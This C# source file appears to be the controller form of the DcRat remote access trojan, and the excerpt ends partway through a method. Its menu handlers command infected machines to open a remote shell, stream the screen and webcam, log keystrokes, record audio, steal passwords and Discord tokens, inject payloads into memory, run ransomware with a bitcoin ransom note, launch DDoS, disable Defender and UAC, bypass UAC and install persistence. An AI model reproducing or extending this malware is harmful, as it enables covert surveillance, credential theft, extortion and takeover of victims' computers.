﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using cGeoIp;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.Forms;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;

namespace Server
{
    public partial class Form1 : Form
    {
        public static List<AsyncTask> getTasks = new List<AsyncTask>();


        private readonly FormDOS formDOS;
        public cGeoMain cGeoMain = new cGeoMain();
        private ListViewColumnSorter lvwColumnSorter;
        private bool trans;

        public Form1()
        {
            InitializeComponent();
            SetWindowTheme(listView1.Handle, "explorer", null);
            Opacity = 0;
            formDOS = new FormDOS
            {
                Name = "DOS",
                Text = "DOS"
            };
        }


        #region Logs

        private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                lock (Settings.LockListviewLogs)
                {
                    listView2.Items.Clear();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        #endregion

        [DllImport("uxtheme", CharSet = CharSet.Unicode)]
        public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

        private void builderToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            using (var formBuilder = new FormBuilder())
            {
                formBuilder.ShowDialog();
            }
        }

        private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            using (var formAbout = new FormAbout())
            {
                formAbout.ShowDialog();
            }
        }

        private void RemoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "shell";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Miscellaneous.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                {
                    var shell = (FormShell)Application.OpenForms["shell:" + client.ID];
                    if (shell == null)
                    {
                        shell = new FormShell
                        {
                            Name = "shell:" + client.ID,
                            Text = "shell:" + client.ID,
                            F = this
                        };
                        shell.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void RemoteScreenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\RemoteDesktop.dll");
                foreach (var client in GetSelectedClients())
                {
                    var remoteDesktop = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + client.ID];
                    if (remoteDesktop == null)
                    {
                        remoteDesktop = new FormRemoteDesktop
                        {
                            Name = "RemoteDesktop:" + client.ID,
                            F = this,
                            Text = "RemoteDesktop:" + client.ID,
                            ParentClient = client,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID,
                                "RemoteDesktop")
                        };
                        remoteDesktop.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void RemoteCameraToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\RemoteCamera.dll");

                    foreach (var client in GetSelectedClients())
                    {
                        var remoteDesktop = (FormWebcam)Application.OpenForms["Webcam:" + client.ID];
                        if (remoteDesktop == null)
                        {
                            remoteDesktop = new FormWebcam
                            {
                                Name = "Webcam:" + client.ID,
                                F = this,
                                Text = "Webcam:" + client.ID,
                                ParentClient = client,
                                FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "Camera")
                            };
                            remoteDesktop.Show();
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\FileManager.dll");

                foreach (var client in GetSelectedClients())
                {
                    var fileManager = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
                    if (fileManager == null)
                    {
                        fileManager = new FormFileManager
                        {
                            Name = "fileManager:" + client.ID,
                            Text = "fileManager:" + client.ID,
                            F = this,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID)
                        };
                        fileManager.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void ProcessManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\ProcessManager.dll");

                foreach (var client in GetSelectedClients())
                {
                    var processManager = (FormProcessManager)Application.OpenForms["processManager:" + client.ID];
                    if (processManager == null)
                    {
                        processManager = new FormProcessManager
                        {
                            Name = "processManager:" + client.ID,
                            Text = "processManager:" + client.ID,
                            F = this,
                            ParentClient = client
                        };
                        processManager.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private async void SendFileToDiskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Multiselect = true;
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                        packet.ForcePathObject("Update").AsString = "false";

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SendFile.dll");

                        foreach (var client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            foreach (var file in openFileDialog.FileNames)
                            {
                                await Task.Run(() =>
                                {
                                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
                                    packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
                                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
                                });
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void SendFileToMemoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var formSend = new FormSendFileToMemory();
                formSend.ShowDialog();
                if (formSend.IsOK)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "sendMemory";
                    packet.ForcePathObject("File")
                        .SetAsBytes(Zip.Compress(File.ReadAllBytes(formSend.toolStripStatusLabel1.Tag.ToString())));
                    if (formSend.comboBox1.SelectedIndex == 0)
                        packet.ForcePathObject("Inject").AsString = "";
                    else
                        packet.ForcePathObject("Inject").AsString = formSend.comboBox2.Text;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SendMemory.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.Red;
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }

                formSend.Close();
                formSend.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var Msgbox = Interaction.InputBox("Message", "Message", "Controlled by DcRat");
                if (string.IsNullOrEmpty(Msgbox)) return;

                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "sendMessage";
                packet.ForcePathObject("Message").AsString = Msgbox;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Extra.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void ChatToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (var client in GetSelectedClients())
                {
                    var chat = (FormChat)Application.OpenForms["chat:" + client.ID];
                    if (chat == null)
                    {
                        chat = new FormChat
                        {
                            Name = "chat:" + client.ID,
                            Text = "chat:" + client.ID,
                            F = this,
                            ParentClient = client
                        };
                        chat.Show();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void VisteWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var url = Interaction.InputBox("Visit website", "URL", "https://www.baidu.com");
                if (string.IsNullOrEmpty(url)) return;

                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "visitURL";
                packet.ForcePathObject("URL").AsString = url;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Extra.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void ChangeWallpaperToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                    using (var openFileDialog = new OpenFileDialog())
                    {
                        openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
                        if (openFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            var packet = new MsgPack();
                            packet.ForcePathObject("Pac_ket").AsString = "wallpaper";
                            packet.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
                            packet.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);

                            var msgpack = new MsgPack();
                            msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                            msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Extra.dll");
                            msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                            foreach (var client in GetSelectedClients())
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Logger.dll");

                foreach (var client in GetSelectedClients())
                {
                    var KL = (FormKeylogger)Application.OpenForms["keyLogger:" + client.ID];
                    if (KL == null)
                    {
                        KL = new FormKeylogger
                        {
                            Name = "keyLogger:" + client.ID,
                            Text = "keyLogger:" + client.ID,
                            F = this,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "Keylogger")
                        };
                        KL.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }


        private void StartToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var title = Interaction.InputBox("Alert when process activive.", "Title 标题",
                    "Uplay,QQ,Chrome,Edge,Word,Excel,PowerPoint,Epic,Steam");
                if (string.IsNullOrEmpty(title)) return;

                lock (Settings.LockReportWindowClients)
                {
                    Settings.ReportWindowClients.Clear();
                    Settings.ReportWindowClients = new List<Clients>();
                }

                Settings.ReportWindow = true;

                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "reportWindow";
                packet.ForcePathObject("Option").AsString = "run";
                packet.ForcePathObject("Title").AsString = title;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                Settings.ReportWindow = false;
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "reportWindow";
                packet.ForcePathObject("Option").AsString = "stop";
                lock (Settings.LockReportWindowClients)
                {
                    foreach (var clients in Settings.ReportWindowClients)
                        ThreadPool.QueueUserWorkItem(clients.Send, packet.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "close";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "restart";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void UpdateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                        packet.ForcePathObject("File")
                            .SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                        packet.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
                        packet.ForcePathObject("Update").AsString = "true";

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SendFile.dll");
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (var client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "uninstall";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var clients = GetSelectedClients();
                if (clients.Length == 0)
                {
                    Process.Start(Application.StartupPath);
                    return;
                }

                foreach (var client in clients)
                {
                    var fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID);
                    if (Directory.Exists(fullPath)) Process.Start(fullPath);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void RebootToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "pcOptions";
                packet.ForcePathObject("Option").AsString = "restart";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void ShutDownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "pcOptions";
                packet.ForcePathObject("Option").AsString = "shutdown";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void LogoutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var packet = new MsgPack();
                packet.ForcePathObject("Pac_ket").AsString = "pcOptions";
                packet.ForcePathObject("Option").AsString = "logoff";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (var client in GetSelectedClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void BlockToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var form = new FormBlockClients())
            {
                form.ShowDialog();
            }
        }

        private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            notifyIcon1.Dispose();
            Environment.Exit(0);
        }

        private void FileSearchToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var form = new FormFileSearcher())
            {
                if (form.ShowDialog() == DialogResult.OK)
                    if (listView1.SelectedItems.Count > 0)
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "fileSearcher";
                        packet.ForcePathObject("SizeLimit").AsInteger = (long)form.numericUpDown1.Value * 1000 * 1000;
                        packet.ForcePathObject("Extensions").AsString = form.txtExtnsions.Text;

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\FileSearcher.dll");
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (var client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
            }
        }

        private void InformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "information";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Information.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void dDOSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.Items.Count > 0)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "dosAdd";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Miscellaneous.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    formDOS.Show();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var Msgbox = Interaction.InputBox("Message", "Message",
                    "All your files have been encrypted. pay us 0.2 BITCOIN. Our address is 1234567890");
                if (string.IsNullOrEmpty(Msgbox)) return;

                if (listView1.SelectedItems.Count > 0)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "encrypt";
                    packet.ForcePathObject("Message").AsString = Msgbox;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Ransomware.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var Msgbox = Interaction.InputBox("Password", "Password");
                if (string.IsNullOrEmpty(Msgbox)) return;

                if (listView1.SelectedItems.Count > 0)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "decrypt";
                    packet.ForcePathObject("Password").AsString = Msgbox;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Ransomware.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void DisableWDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                var dialogResult = MessageBox.Show(this, "Only for Admin.", "Disbale Defender", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Information);
                if (dialogResult == DialogResult.Yes)
                    try
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "disableDefedner";

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Extra.dll");
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (var client in GetSelectedClients())
                            if (client.LV.SubItems[lv_admin.Index].Text == "Admin")
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
            }
        }

        private void RecordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (var client in GetSelectedClients())
                {
                    var audiorecord = (FormAudio)Application.OpenForms["Audio Recorder:" + client.ID];
                    if (audiorecord == null)
                    {
                        audiorecord = new FormAudio
                        {
                            Name = "Audio Recorder:" + client.ID,
                            Text = "Audio Recorder:" + client.ID,
                            F = this,
                            ParentClient = client,
                            Client = client
                        };
                        audiorecord.Show();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void RunasToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "uac";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        private void SilentCleanupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "uacbypass";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        private void SchtaskInstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "schtaskinstall";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        private void PasswordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Recovery.dll");

                foreach (var client in GetSelectedClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                new HandleLogs().Addmsg("Recovering...", Color.Black);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void DiscordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Discord.dll");

                foreach (var client in GetSelectedClients())
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                new HandleLogs().Addmsg("Recovering Discord...", Color.Black);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void FodhelperToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "uacbypass3";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Options.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        private void DisableUACToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                var dialogResult = MessageBox.Show(this, "Only for Admin.", "Disbale UAC", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Information);
                if (dialogResult == DialogResult.Yes)
                    try
